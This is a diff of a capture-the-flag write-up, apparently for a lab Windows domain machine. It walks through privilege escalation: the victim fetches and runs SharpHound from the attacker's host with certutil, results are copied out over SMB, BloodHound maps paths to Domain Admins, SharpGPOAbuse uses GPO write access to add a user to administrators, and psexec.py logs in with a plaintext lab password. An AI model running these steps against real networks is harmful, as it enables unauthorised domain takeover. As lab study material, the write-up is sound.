@@ -180,9 +180,9 @@ After a few moments we get a connection
 
 ## Privilege Escalation&#x20;
 
-[https://korbinian-spielvogel.de/posts/vulnnet-active-writeup/#privilege-escalation](https://korbinian-spielvogel.de/posts/vulnnet-active-writeup/#privilege-escalation)
+### Download SharpHound PS1
 
-
+This failed because when running the script it would just hang and I had to reset the server. So After I tried with the exe.
 
 **Kali**
 
@@ -200,6 +200,8 @@ powershell -ep bypass
 .\SharpHound.ps1 
 ```
 
+### Download SharpHound EXE
+
 **Kali**
 
 ```
@@ -208,11 +210,56 @@ cp BloodHound/Collectors/SharpHound.exe .
 python2 -m SimpleHTTPServer 82
 ```
 
+**Victim(Powershell)**
 
+```
+certutil -urlcache -f http://$KALI:82/SharpHound.exe SharpHound.exe
+SharpHound.exe
+```
 
+### **Transfer results to Kali**
 
+**Victim(Powershell)**
 
+```
+copy 20240405092615_BloodHound.zip C:\Enterprise-Share\
+```
 
+**Kali(smbclient)**
+
+```
+get 20240405092615_BloodHound.zip
+```
+
+### BloodHound  <a href="#bloodhound-installation" id="bloodhound-installation"></a>
+
+**Kali #1**
+
+```
+neo4j console
+```
+
+**Kali #2**
+
+```
+bloodhound --no-sandbox
+```
+
+We can just drag the zip file to bloodhound to import it.
+
+<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+#### Find Shortest Paths to Domain Admins
+
+<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+Our user enterprise-security has write access to the GPO called "SECURITY-POL-VN"
+
+<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+
+### SharpGPOAbuse
 
 **Kali**
 
@@ -230,6 +277,8 @@ certutil -urlcache -f http://$KALI:82/SharpGPOAbuse.exe SharpGPOAbuse.exe
 
 
 
+This task is running one command which is to add our user enterprise-security to the administrator group
+
 **Victim(Powershell)**
 
 ```
@@ -238,7 +287,7 @@ certutil -urlcache -f http://$KALI:82/SharpGPOAbuse.exe SharpGPOAbuse.exe
 
 <figure><img src="../../.gitbook/assets/image (888).png" alt=""><figcaption></figcaption></figure>
 
-
+After the change is successful we just need to push the GPU for it to work.
 
 **Victim(Powershell)**
 
@@ -251,6 +300,8 @@ certutil -urlcache -f http://$KALI:82/SharpGPOAbuse.exe SharpGPOAbuse.exe
 **Kali**
 
 ```
- psexec.py enterprise-security:sand_0873959498@$VICTIM
+psexec.py enterprise-security:sand_0873959498@$VICTIM
 ```
+
+<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
 
